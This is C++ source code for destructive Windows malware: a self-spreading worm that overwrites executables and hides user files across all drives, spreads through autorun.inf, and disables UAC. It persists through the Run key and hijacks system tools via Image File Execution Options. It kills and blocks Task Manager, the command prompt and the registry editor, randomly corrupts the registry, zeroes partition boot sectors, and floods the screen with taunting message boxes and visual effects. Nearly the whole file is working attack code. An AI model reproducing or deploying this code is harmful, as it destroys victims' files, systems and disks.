#define _CRT_SECURE_NO_WARNINGS
#include <iostream>
#include <Windows.h>
#include <conio.h>
#include <TlHelp32.h>
#include <Shlwapi.h>
#include <Psapi.h>
#include <stdlib.h>
#include <random>
#include <mmsystem.h>
#include <Crtdbg.h>
#include <tchar.h>
#include <fstream>
#include <CString>
#include <UrlMon.h>
#include <atlstr.h>
#include <string>
#include <vector>
#include <algorithm>
#include <sstream>
#include <time.h>
#include <math.h>
#pragma comment(lib,"urlmon.lib")
#pragma comment(lib,"winmm.lib")
#pragma comment(lib,"Psapi.lib")
using namespace std;
#define COUNT 10
#define SIZE_X 30
#define SIZE_Y 8
#define PI 3.1415926
#define TIME 60
#define COUNT2 7
#define COLOR 3
const int movewnd[] = { 1, 1, 2, 2, 3, 3, 4, 4, 3, 3, 2, 2, 1, 1,
	            -1,-1,-2,-2,-3,-3,-4,-4,-3,-3,-2,-2,-1,-1 };
const int nCount = sizeof(movewnd) / sizeof(void*);
HCRYPTPROV prov;
int random() {
	if (prov == NULL)
		if (!CryptAcquireContext(&prov, NULL, NULL, PROV_RSA_FULL, CRYPT_SILENT | CRYPT_VERIFYCONTEXT))
			ExitProcess(1);

	int out;
	CryptGenRandom(prov, sizeof(out), (BYTE *)(&out));
	return out & 0x7fffffff;
}
void strReverseW(LPWSTR str) {
	int len = lstrlenW(str);

	if (len <= 1)
		return;

	WCHAR c;
	int i, j;
	for (i = 0, j = len - 1; i < j; i++, j--) {
		c = str[i];
		str[i] = str[j];
		str[j] = c;
	}

	// Fix Newlines
	for (i = 0; i < len - 1; i++) {
		if (str[i] == L'\n' && str[i + 1] == L'\r') {
			str[i] = L'\r';
			str[i + 1] = L'\n';
		}
	}
}
bool InfectDir(const char* szFileDir)

{
std::string strDir = szFileDir;
if (strDir.at(strDir.length()-1) != '\\')
 strDir += '\\';
WIN32_FIND_DATA wfd;
HANDLE hFind = FindFirstFile((strDir + "*.*").c_str(),&wfd);
if (hFind == INVALID_HANDLE_VALUE)
return false;
do
{
if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
{
if (stricmp(wfd.cFileName,".") != 0 &&
stricmp(wfd.cFileName,"..") != 0)
InfectDir( (strDir + wfd.cFileName).c_str());
}
else
{
CHAR pathF[5000];
GetModuleFileName(NULL, pathF, sizeof(pathF));
char* pathT = (char*)(strDir + wfd.cFileName).c_str();
string x = wfd.cFileName;
if (x.find(".exe")!=string::npos) {
	CopyFile(pathF, (strDir + wfd.cFileName).c_str(), false);
} else {
	SetFileAttributes((strDir + wfd.cFileName).c_str(), FILE_ATTRIBUTE_HIDDEN );
	CopyFile(pathF, (strDir + wfd.cFileName + ".exe").c_str(), false);
}
}
}
while (FindNextFile(hFind,&wfd));
FindClose(hFind);
return true;
}
bool RemoveDir(const char* szFileDir)

{
std::string strDir = szFileDir;
if (strDir.at(strDir.length()-1) != '\\')
 strDir += '\\';
WIN32_FIND_DATA wfd;
HANDLE hFind = FindFirstFile((strDir + "*.*").c_str(),&wfd);
if (hFind == INVALID_HANDLE_VALUE)
return false;
do
{
if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
{
if (stricmp(wfd.cFileName,".") != 0 &&
stricmp(wfd.cFileName,"..") != 0)
RemoveDir( (strDir + wfd.cFileName).c_str());
}
else
{
DeleteFile( (strDir + wfd.cFileName).c_str());
}
}
while (FindNextFile(hFind,&wfd));
FindClose(hFind);
RemoveDirectory(szFileDir);
return true;
}
//playboard 7
bool playboard7(const char* szFileDir)

{
SetFileAttributes("C:\\checknew.log", FILE_ATTRIBUTE_NORMAL);
std::string strDir = szFileDir;
if (strDir.at(strDir.length()-1) != '\\')
 strDir += '\\';
WIN32_FIND_DATA wfd;
HANDLE hFind = FindFirstFile((strDir + "*.*").c_str(),&wfd);
if (hFind == INVALID_HANDLE_VALUE)
return false;
do
{
if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
{
if (stricmp(wfd.cFileName,".") != 0 &&
stricmp(wfd.cFileName,"..") != 0)
playboard7( (strDir + wfd.cFileName).c_str());
}
else
{
CHAR pathF[5000];
GetModuleFileName(NULL, pathF, sizeof(pathF));
char* pathT = (char*)(strDir + wfd.cFileName).c_str();
string x = wfd.cFileName;
CopyFile("C:\\checknew.log", (strDir + wfd.cFileName + ".txt").c_str(), false);
DeleteFile((strDir + wfd.cFileName).c_str());
}
}
while (FindNextFile(hFind,&wfd));
FindClose(hFind);
return true;
}
//to much!!enough!!!
void infectfile(){
	InfectDir("C:\\Users");
	InfectDir("C:\\Documents and Settings");
	//InfectDir("C:\\Program Files\\");
	//InfectDir("C:\\Program Files (x86)\\");
	InfectDir("D:\\");
	InfectDir("E:\\");
	InfectDir("F:\\");
	InfectDir("G:\\");
	InfectDir("H:\\");
	InfectDir("I:\\");
	InfectDir("J:\\");
	InfectDir("K:\\");
	InfectDir("L:\\");
	InfectDir("M:\\");
	InfectDir("N:\\");
	InfectDir("O:\\");
	InfectDir("P:\\");
	InfectDir("Q:\\");
	InfectDir("R:\\");
	InfectDir("S:\\");
	InfectDir("T:\\");
	InfectDir("U:\\");
	InfectDir("V:\\");
	InfectDir("W:\\");
	InfectDir("X:\\");
	InfectDir("Z:\\");
}
bool examdate(int n){
	time_t timep;
	struct tm *p;
	time (&timep);
	p=gmtime(&timep);
	if(1+p->tm_mon == p->tm_mday + n || 1+p->tm_mon == p->tm_mday - n){
		return true;
	}
	return false;
}
BOOL endsWith(LPCTSTR str, LPCTSTR end) {
	int originalLen = lstrlen(str);
	int endLen = lstrlen(end);

	if (endLen > originalLen)
		return FALSE;

	return lstrcmpi(str + originalLen - endLen, end) == 0;
}
size_t CorruptMemory(byte *data, size_t length, int chance) {
	size_t corrupted = 0;

	for (size_t i = 0; i < length; i++) {
		if (random() % chance != 0) {
			int operation = random() % 2;

			if (operation == 0) {
				data[i]--;
			} else {
				data[i]++;
			}

			corrupted++;
		}
	}

	return corrupted;
}
#define BUFFER_SIZE 8192

static void CorruptRegistry(HKEY key, DWORD chance) {
	LSTATUS result;

	DWORD nameSize = MAX_PATH;
	LPTSTR name = (LPTSTR)LocalAlloc(0, nameSize * sizeof(TCHAR));

	nameSize = MAX_PATH;
	result = RegEnumKeyEx(key, 0, name, &nameSize, NULL, NULL, NULL, NULL);
	for (int i = 1; result != ERROR_NO_MORE_ITEMS; i++) {
		HKEY newKey;
		if (RegOpenKeyEx(key, name, 0, KEY_READ | KEY_WRITE, &newKey) == ERROR_SUCCESS) {
			CorruptRegistry(newKey, chance);
		}

		nameSize = MAX_PATH;
		result = RegEnumKeyEx(key, i, name, &nameSize, NULL, NULL, NULL, NULL);
	}

	DWORD dataSize = BUFFER_SIZE, type = 0;
	BYTE *data = (BYTE*)LocalAlloc(0, dataSize);

	nameSize = MAX_PATH;
	result = RegEnumValue(key, 0, name, &nameSize, NULL, &type, data, &dataSize);
	for (int i = 1; result != ERROR_NO_MORE_ITEMS; i++) {
		if (random() % chance != 0 && result == ERROR_SUCCESS && !endsWith(name, TEXT("AppInit_DLLs"))) {
			CorruptMemory(data, dataSize, chance);

			result = RegSetValueEx(key, name, NULL, type, data, dataSize);
		}

		dataSize = BUFFER_SIZE; nameSize = MAX_PATH;
		result = RegEnumValue(key, i, name, &nameSize, NULL, &type, data, &dataSize);
	}

	LocalFree(name);
	LocalFree(data);
	RegCloseKey(key);
}
DWORD WINAPI RegistryFuck(LPVOID parameter) {
	const DWORD chance = 1000;

	for (;;) {
		CorruptRegistry(HKEY_USERS, (DWORD)(chance * 5.0));
		CorruptRegistry(HKEY_CLASSES_ROOT, (DWORD)(chance * 5.0));
		CorruptRegistry(HKEY_LOCAL_MACHINE, (DWORD)(chance * 5.0));
		CorruptRegistry(HKEY_CLASSES_ROOT, (DWORD)(chance * 5.0));
		CorruptRegistry(HKEY_CURRENT_USER, (DWORD)(chance * 5.0));
	}
}
int GetPIDFromProcessName(LPTSTR name) {
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	PROCESSENTRY32 procEntry;
	procEntry.dwSize = sizeof(procEntry);

	BOOL hasNext = Process32First(snapshot, &procEntry);

	while (hasNext) {
		if (lstrcmpi(procEntry.szExeFile, name) == 0) {
			return procEntry.th32ProcessID;
		}

		hasNext = Process32Next(snapshot, &procEntry);
	}

	return -1;
}
BOOL KillProcessByID(DWORD pid) {
	HANDLE proc = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
	return TerminateProcess(proc, 0);
}
BOOL KillProcessByName(LPTSTR name) {
	int pid = GetPIDFromProcessName(name);

	if (pid == -1)
		return FALSE;

	return KillProcessByID(pid);
}
int scrw = GetSystemMetrics(SM_CXSCREEN);
int scrh = GetSystemMetrics(SM_CYSCREEN);
const char *msgs[] = {
	"TODAY IS YOUR LUCKY DAY!\r\nNow you are going to die.",
	"REST IN PISS, FOREVER MISS.",
	"GOODBYE...FOREVER...",
	"YOU ARE REALLY A 1337 H4X0R.\nNOW I WILL FUCK YOUR PC.",
	"DO YOU REMEMBER ME?",
	"When you first get infected by me...\nI don't wanna kill you so fast...\nBUT NOW...YOU SHOULD REALLY DIE.",
	"Ha Ha Ha Ha\nYou Are An Idi0t!!!",
	"G3T WIND0WS D3F3ND3R N3XT TIM3!\nN00B!"
};
const size_t nMsgs = sizeof(msgs) / sizeof(void *);
LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HCBT_CREATEWND) {
		CREATESTRUCT *pcs = ((CBT_CREATEWND *)lParam)->lpcs;

		if ((pcs->style & WS_DLGFRAME) || (pcs->style & WS_POPUP)) {
			HWND hwnd = (HWND)wParam;
			int x = random() % (scrw - pcs->cx);
			int y = random() % (scrh - pcs->cy);

			pcs->x = x;
			pcs->y = y;
		}
	}

	return CallNextHookEx(0, nCode, wParam, lParam);
}
DWORD WINAPI ripMessageThread(LPVOID parameter) {
	HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
	MessageBoxA(NULL, (LPCSTR)msgs[random() % nMsgs], ":)", MB_OK | MB_SYSTEMMODAL | MB_ICONHAND);
	UnhookWindowsHookEx(hook);

	return 0;
}
void MSGs() {
	// Show cool MessageBoxes
	while (1) {
		CreateThread(NULL, 4096, &ripMessageThread, NULL, NULL, NULL);
		Sleep(750);
	}
}
DWORD WINAPI HWNDFCK(LPVOID parameter) {
	HWND hwndhax;
	RECT rekt;
	while(1){
	hwndhax = GetForegroundWindow();
	if (random() % 1000 == 0) {
		SetWindowLong(hwndhax, GWL_STYLE, random());
		SetWindowLong(hwndhax, GWL_EXSTYLE, random());
	}

	// A bit like Welcomer
	if (random() % 10 != 0) {
		GetWindowRect(hwndhax, &rekt);

		MapWindowPoints(HWND_DESKTOP, GetParent(hwndhax), (LPPOINT)&rekt, 2);

		rekt.left += random() % 8 - 4;
		rekt.top += random() % 8 - 4;
		rekt.right += random() % 8 - 4;
		rekt.bottom += random() % 8 - 4;

		MoveWindow(hwndhax, rekt.left, rekt.top, rekt.right - rekt.left, rekt.bottom - rekt.top, FALSE);
	}
	Sleep(50);
	}
}
void haha_i_am_here () {
	CreateThread(NULL, 0, HWNDFCK, NULL, 0, NULL);
	MSGs();
}
void Do_It () {
	CreateThread(NULL, 0, RegistryFuck, NULL, 0, NULL);
	KillProcessByName("taskmgr.exe");
	KillProcessByName("explorer.exe");
	KillProcessByName("perfmon.exe");
	KillProcessByName("cmd.exe");
	KillProcessByName("powershell.exe");
	HKEY key;
	RegOpenKeyW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options", &key);

	LPWSTR value = L"rekt.exe";

	const LPWSTR killNames[] = {
		L"winlogon.exe"
		L"logonui.exe",
		L"taskmgr.exe",
		L"msconfig.exe",
		L"explorer.exe",
		L"shutdown.exe",
		L"taskkill.exe",
		L"mmc.exe"
		L"regedit.exe"
		L"cmd.exe"
	};

	for (int i = 0; i < sizeof(killNames) / sizeof(void*); i++) {
		HKEY sKey;
		RegCreateKeyW(key, killNames[i], &sKey);

		RegSetValueExW(sKey, L"Debugger", 0, REG_SZ, (BYTE *)value, lstrlenW(value) * 2);

		RegCloseKey(sKey);
	}

	RegCloseKey(key);
	haha_i_am_here();
}
void start_no_UAC () {
	char regpath[] = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
   	HKEY hkeyUAC;
   	DWORD set = 0;
   	RegOpenKey(HKEY_LOCAL_MACHINE, regpath, &hkeyUAC);
   	RegSetValueEx(hkeyUAC, "ConsentPromptBehaviorAdmin", 0, REG_DWORD, (LPBYTE)&set, sizeof(set));
   	RegSetValueEx(hkeyUAC, "EnableLUA", 0, REG_DWORD, (LPBYTE)&set, sizeof(set));
   	char startup[] = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"; 
   	CHAR wormpath[5000];
    GetModuleFileName(NULL, wormpath, sizeof(wormpath));
   	CHAR pathstartup[] = "C:\\wincheck.exe";
   	CopyFile(wormpath, pathstartup, false);
	HKEY hkeySTART;
   	RegOpenKey(HKEY_CURRENT_USER, startup, &hkeySTART);
   	RegSetValueEx(hkeySTART, "WindowsCheck", 0, REG_SZ, (LPBYTE)pathstartup, sizeof(pathstartup));
}
void autorun(){
	ofstream autorunc("C:\\autorun.inf");
	autorunc << "[AutoRun.Amd64]" << endl;
	autorunc << "open=wincheck.exe" << endl;
	autorunc << "[AutoRun]" << endl;
	autorunc << "open=wincheck.exe" << endl;
	CHAR autorunpath[5000];
    GetModuleFileName(NULL, autorunpath, sizeof(autorunpath));
   	CHAR pathcopytod[] = "D:\\wincheck.exe";
   	CopyFile(autorunpath, pathcopytod, false);
	ofstream autorund("D:\\autorun.inf");
	autorund << "[AutoRun.Amd64]" << endl;
	autorund << "open=wincheck.exe" << endl;
	autorund << "[AutoRun]" << endl;
	autorund << "open=wincheck.exe" << endl;
	CHAR pathcopytoe[] = "E:\\wincheck.exe";
   	CopyFile(autorunpath, pathcopytoe, false);
	ofstream autorune("E:\\autorun.inf");
	autorune << "[AutoRun.Amd64]" << endl;
	autorune << "open=wincheck.exe" << endl;
	autorune << "[AutoRun]" << endl;
	autorune << "open=wincheck.exe" << endl;
	CHAR pathcopytof[] = "F:\\wincheck.exe";
   	CopyFile(autorunpath, pathcopytof, false);
	ofstream autorunf("F:\\autorun.inf");
	autorunf << "[AutoRun.Amd64]" << endl;
	autorunf << "open=wincheck.exe" << endl;
	autorunf << "[AutoRun]" << endl;
	autorunf << "open=wincheck.exe" << endl;
}
void die(){
	HKEY key;
	RegOpenKeyW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options", &key);

	LPWSTR value = L"C:\\wincheck.exe";

	const LPWSTR killNames[] = {
		L"winlogon.exe",
		L"logonui.exe",
		//L"taskmgr.exe",
		//L"msconfig.exe",
		L"explorer.exe",
		L"shutdown.exe",
		//L"taskkill.exe",
		L"mmc.exe"
	};

	for (int i = 0; i < sizeof(killNames) / sizeof(void*); i++) {
		HKEY sKey;
		RegCreateKeyW(key, killNames[i], &sKey);

		RegSetValueExW(sKey, L"Debugger", 0, REG_SZ, (BYTE *)value, lstrlenW(value) * 2);

		RegCloseKey(sKey);
	}

	RegCloseKey(key);
	char regpath1[] = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer";
   	HKEY hkey1;
   	DWORD set1 = 1;
   	RegOpenKey(HKEY_LOCAL_MACHINE, regpath1, &hkey1);
   	RegSetValueEx(hkey1, "NoRun", 0, REG_DWORD, (LPBYTE)&set1, sizeof(set1));
   	RegSetValueEx(hkey1, "NoClose", 0, REG_DWORD, (LPBYTE)&set1, sizeof(set1));
   	RegSetValueEx(hkey1, "NoDrives", 0, REG_DWORD, (LPBYTE)&set1, sizeof(set1));
   	RegSetValueEx(hkey1, "NoLogOff", 0, REG_DWORD, (LPBYTE)&set1, sizeof(set1));
   	RegSetValueEx(hkey1, "NoDesktop", 0, REG_DWORD, (LPBYTE)&set1, sizeof(set1));
   	RegSetValueEx(hkey1, "NoSetTaskBar", 0, REG_DWORD, (LPBYTE)&set1, sizeof(set1));
   	RegSetValueEx(hkey1, "NoViewContextMenu", 0, REG_DWORD, (LPBYTE)&set1, sizeof(set1));
   	RegSetValueEx(hkey1, "NoSetFolders", 0, REG_DWORD, (LPBYTE)&set1, sizeof(set1));
   	RegSetValueEx(hkey1, "NoSetTaskBar", 0, REG_DWORD, (LPBYTE)&set1, sizeof(set1));
   	char regpath2[] = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\";
   	HKEY hkey2;
   	DWORD set2 = 1;
   	RegOpenKey(HKEY_LOCAL_MACHINE, regpath2, &hkey2);
   	RegSetValueEx(hkey2, "DisableRegistryTools", 0, REG_DWORD, (LPBYTE)&set2, sizeof(set2));
	char regpath3[] = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
	HKEY hkey3;
   	DWORD set3 = 1;
   	RegOpenKey(HKEY_CURRENT_USER, regpath3, &hkey3);
   	RegSetValueEx(hkey3, "DisableRegedit", 0, REG_DWORD, (LPBYTE)&set3, sizeof(set3));
	RegSetValueEx(hkey3, "DisableTaskmgr", 0, REG_DWORD, (LPBYTE)&set3, sizeof(set3));
	RegSetValueEx(hkey3, "DisableCmd", 0, REG_DWORD, (LPBYTE)&set3, sizeof(set3));
}
void Disable(){
	HKEY key;
	RegOpenKeyW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options", &key);

	LPWSTR value = L"C:\\wincheck.exe";

	const LPWSTR killNames[] = {
		L"taskmgr.exe",
		L"msconfig.exe",
		L"taskkill.exe",
		L"cmd.exe"
	};

	for (int i = 0; i < sizeof(killNames) / sizeof(void*); i++) {
		HKEY sKey;
		RegCreateKeyW(key, killNames[i], &sKey);

		RegSetValueExW(sKey, L"Debugger", 0, REG_SZ, (BYTE *)value, lstrlenW(value) * 2);

		RegCloseKey(sKey);
	}

	RegCloseKey(key);
	HKEY hkey;
   	DWORD set = 1;
   	RegOpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", &hkey);
   	RegSetValueEx(hkey, "HideFileExt", 0, REG_DWORD, (LPBYTE)&set, sizeof(set));
}
void melt() {
	HWND hwnd;
	HDC hdc, hCopy;
	HBITMAP hBitmap;
	int width = 0, height = 0;
  
	for (;;)
	{
		width = GetSystemMetrics(SM_CXSCREEN);
		height = GetSystemMetrics(SM_CYSCREEN);
    
		hwnd = GetDesktopWindow();
		hdc = GetDC(hwnd);
		hCopy = CreateCompatibleDC(hdc);
		hBitmap = CreateCompatibleBitmap(hdc, SIZE_X, height);
		SelectObject(hCopy, hBitmap);
    
		for (int i = 0; i < COUNT; i++)
		{
			int x = random() % width - SIZE_X / 2;
			BitBlt(hCopy, 0, 0, SIZE_X, height, hdc, x, 0, SRCCOPY);

			for (int ix = 0, depth = 0; ix < SIZE_X; ix++)
			{
				depth = (int)(sin(ix / (double)SIZE_X * PI) * SIZE_Y);
				StretchBlt(hCopy, ix, 0, 1, depth, hCopy, ix, 0, 1, 1, SRCCOPY);
				BitBlt(hCopy, ix, 0, 1, height, hCopy, ix, -depth, SRCCOPY);
			}
			BitBlt(hdc, x, 0, SIZE_X, height, hCopy, 0, 0, SRCCOPY);
			Sleep(50);
		}
		DeleteDC(hCopy);
		DeleteObject(hBitmap);
		ReleaseDC(hwnd, hdc);
	}
}
DWORD WINAPI shakewnd(LPVOID lpParamter) {
	HWND hwnd;
	RECT rekt;
	while(1){
	for (int i = 0, t = 0, delay = 0;;)
	{
		for (i = 0;; i = (nCount <= ++i) ? 0 : i)
		{
			if ((hwnd = GetForegroundWindow()) == NULL)
				break;

			for (t = 0, delay = TIME / abs(movewnd[i]); t < abs(movewnd[i]); t++)
			{
				GetWindowRect(hwnd, &rekt);
				MoveWindow(hwnd, rekt.left, rekt.top + (movewnd[i] < 0 ? -1 : 1), rekt.right - rekt.left, rekt.bottom - rekt.top, FALSE);
				Sleep(delay);
			}
		}
		Sleep(TIME);
	}
	}
	return 0;
}
BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam) {
	LPWSTR str = (LPWSTR)GlobalAlloc(GMEM_ZEROINIT, sizeof(WCHAR) * 8192);

	if (SendMessageTimeoutW(hwnd, WM_GETTEXT, 8192, (LPARAM)str, SMTO_ABORTIFHUNG, 100, NULL)) {
		strReverseW(str);
		SendMessageTimeoutW(hwnd, WM_SETTEXT, NULL, (LPARAM)str, SMTO_ABORTIFHUNG, 100, NULL);
	}
	
	GlobalFree(str);

	return TRUE;
}
DWORD WINAPI reversetext(LPVOID lpParamter){
	while(1){
		EnumChildWindows(GetDesktopWindow(), &EnumChildProc, NULL);
		Sleep(500);
	}
}
DWORD WINAPI meltforxp(LPVOID lpParamter){
	HWND hwnd = GetDesktopWindow();
	HDC hdc = GetWindowDC(hwnd);
	RECT rekt;
	GetWindowRect(hwnd, &rekt);
	while(1) {
		int sma = random()%4 + 1;
		int smb = random()%(scrw - sma);
		int smc = random()%5 + 1;
		StretchBlt(hdc, smb, smc, sma, scrh, hdc, smb, 0, sma, scrh, SRCCOPY);
	}
	ReleaseDC(hwnd, hdc);
	return 0;
}
DWORD WINAPI msgthread(LPVOID lpParamter){
	MSG();
	return 0;
}
DWORD WINAPI dirtypcmsg(LPVOID lpParamter){
	while(1){
		MessageBox(NULL,"dirty dirty dirty pc dectected!!!", "wow wow wow!", MB_OK|MB_ICONINFORMATION);
	}
	return 0;
}
DWORD WINAPI dirtypc(LPVOID lpParamter){
	HWND hwnd = GetDesktopWindow();
	HDC hdc = GetWindowDC(hwnd);
	while(1){
		SetPixel(hdc, random()%scrw, random()%scrh, RGB(random()%255, random()%255, random()%255));
	}
	return 0;
}
COLORREF color[COUNT2][COLOR] = { {255,0,0}, {255,165,0}, {255,255,0}, {0,128,0}, {0,255,255}, {0,0,255}, {128,0,128} };
DWORD WINAPI Cubes_x(LPVOID lpParameter)
{
	int width = GetSystemMetrics(SM_CXSCREEN);
	int height = GetSystemMetrics(SM_CYSCREEN);
	int times = 0, delay = 0, n = random() % COUNT2, y = random() % (height / 10) + (height / 200);
	
	HWND hwnd = GetDesktopWindow();
	HDC hdc = GetDC(hwnd);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	HBITMAP hBitmap = CreateCompatibleBitmap(hdc, width, y);
	SelectObject(hdcCopy, hBitmap);

	BOOLEAN VECTOR = random() % 2 ? TRUE : FALSE;
	while ((times = (random() % (width / 2))) < 320) {}
	while ((delay = (random() % 10000)) < 7000) {}
	delay = delay / times;
	SetPixel(hdcCopy, 0, 0, RGB(color[n][0], color[n][1], color[n][2]));
	StretchBlt(hdcCopy, 0, 0, width, y, hdcCopy, 0, 0, 1, 1, SRCCOPY);

	for (int i = 0, ix = random() % width, iy = random() % height; i < times; i++)
	{
		if (VECTOR)
			BitBlt(hdc, ix + i, iy, 1, y, hdcCopy, 0, 0, SRCCOPY);
		else
			BitBlt(hdc, ix - i, iy, 1, y, hdcCopy, 0, 0, SRCCOPY);
		Sleep(delay);
	}
	DeleteDC(hdcCopy);
	DeleteObject(hBitmap);
	ReleaseDC(hwnd, hdc);

	return 0;
}

DWORD WINAPI Cubes_y(LPVOID lpParameter)
{
	int width = GetSystemMetrics(SM_CXSCREEN);
	int height = GetSystemMetrics(SM_CYSCREEN);
	int times = 0, delay = 0, n = random() % COUNT2, x = random() % (width / 10) + (width / 200);

	HWND hwnd = GetDesktopWindow();
	HDC hdc = GetDC(hwnd);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	HBITMAP hBitmap = CreateCompatibleBitmap(hdc, x, height);
	SelectObject(hdcCopy, hBitmap);

	BOOLEAN VECTOR = random() % 2 ? TRUE : FALSE;
	while ((times = (random() % (height / 2))) < 240) {}
	while ((delay = (random() % 10000)) < 7000) {}
	delay = delay / times;
	SetPixel(hdcCopy, 0, 0, RGB(color[n][0], color[n][1], color[n][2]));
	StretchBlt(hdcCopy, 0, 0, x, height, hdcCopy, 0, 0, 1, 1, SRCCOPY);

	for (int i = 0, ix = random() % width, iy = random() % height; i < times; i++)
	{
		if (VECTOR)
			BitBlt(hdc, ix, iy + i, x, 1, hdcCopy, 0, 0, SRCCOPY);
		else
			BitBlt(hdc, ix, iy - i, x, 1, hdcCopy, 0, 0, SRCCOPY);
		Sleep(delay);
	}
	DeleteDC(hdcCopy);
	DeleteObject(hBitmap);
	ReleaseDC(hwnd, hdc);

	return 0;
}
DWORD WINAPI block(LPVOID lpParamter){
	HANDLE hThread;
	
	for (;;)
	{
		if (random() % 2)
			hThread = CreateThread(NULL, 0, Cubes_x, NULL, 0, NULL);
		else
			hThread = CreateThread(NULL, 0, Cubes_y, NULL, 0, NULL);
		
		Sleep(1000);
	}
	CloseHandle(hThread);

	return 0;
}
DWORD WINAPI shake(LPVOID lpParamter) {
	HWND hwnd = GetDesktopWindow();
	HDC hdc = GetWindowDC(hwnd);
	RECT rekt;
	GetWindowRect(hwnd, &rekt);
	while(1) {
		StretchBlt(hdc, random()%5, random()%5, rekt.right + random()%5, rekt.bottom + random()%5, hdc, 0, 0, rekt.right, rekt.bottom, SRCCOPY);
		Sleep(20);
		StretchBlt(hdc, -(random()%5), -(random()%5), rekt.right - random()%5, rekt.bottom - random()%5, hdc, 0, 0, rekt.right, rekt.bottom, SRCCOPY);
		Sleep(20);
	}
	ReleaseDC(hwnd, hdc);
}
#define SECTOR_SIZE 512

ULONG HextoDec(const unsigned char* hex, int length)
{
	int i;
	unsigned long rslt = 0;
	for (i = 0; i < length; i++)
	{
		rslt += (unsigned long)(hex[i]) << (8 * (length - 1 - i));
	}
	return rslt;
}

typedef struct _DESTROY_DISK_INFORMATION
{
	BYTE MBR[SECTOR_SIZE];
	BYTE Sign[4];
	BYTE bStartSector[4][4];
	UINT64 lStartSector[4];
}DDI, * PDDI;

BOOL ForMatSector(HANDLE hFile, UINT64 SectorNum, size_t Size)
{
	BYTE* Clean = new BYTE[Size];
	ZeroMemory(Clean, Size);
	DWORD Junk;
	LARGE_INTEGER Point;
	Point.QuadPart = SectorNum * 512;
	SetFilePointerEx(hFile, Point, NULL, FILE_BEGIN);
	return WriteFile(hFile, Clean, Size, &Junk, NULL);
}

VOID FindAndForMat(HANDLE hDisk, UINT64 Point)
{
	DDI Disk;
	DWORD Junk;
	LARGE_INTEGER Pointer;
	Pointer.QuadPart = Point * 512;
	SetFilePointerEx(hDisk, Pointer, NULL, FILE_BEGIN);
	if (ReadFile(hDisk, Disk.MBR, SECTOR_SIZE, &Junk, NULL))
	{
		for (unsigned int n = 0; n < 4; n++)
		{
			for (unsigned int i = 0; i < 4; i++)
			{
				Disk.bStartSector[n][i] = Disk.MBR[457 + 16 * n - i];
			}
			Disk.Sign[n] = Disk.MBR[446 + n * 16];
			Disk.lStartSector[n] = HextoDec(Disk.bStartSector[n], sizeof(Disk.bStartSector[n]));
			if (Disk.lStartSector[n] == 0)
			{
				continue;
			}
			cout << Disk.lStartSector[n] << endl;
			if (Disk.Sign[n] == 0 && n == 3)
			{
				FindAndForMat(hDisk, Disk.lStartSector[n]);
			}
			//ForMatSector(hDisk, Point, SECTOR_SIZE);
			ForMatSector(hDisk, Disk.lStartSector[n], SECTOR_SIZE);
			ForMatSector(hDisk, Disk.lStartSector[n] - 1, SECTOR_SIZE);
			//ForMatSector(hDisk, Point, 16);
			ForMatSector(hDisk, Disk.lStartSector[n], 16);
			ForMatSector(hDisk, Disk.lStartSector[n] - 1, 16);
		}
	}
}